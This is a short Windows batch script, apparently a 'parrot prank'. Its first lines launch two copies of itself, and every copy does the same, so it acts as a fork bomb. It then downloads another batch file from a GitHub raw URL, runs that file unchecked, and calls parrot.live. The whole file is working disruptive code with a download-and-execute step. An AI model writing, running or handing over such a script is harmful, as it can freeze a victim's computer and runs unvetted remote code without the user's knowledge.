@ECHO OFF
title %~n0
start %~n0%~x0
start %~n0%~x0

SET randomstr=%random%%random%%random%
SET randomstr=%randomstr:0=a%
SET randomstr=%randomstr:1=b%
SET randomstr=%randomstr:2=c%

MKDIR %randomstr%

curl https://raw.githubusercontent.com/PABLO4316/parrotPrank/main/parrot.bat --output %randomstr%.bat
start %randomstr%.bat

curl parrot.live
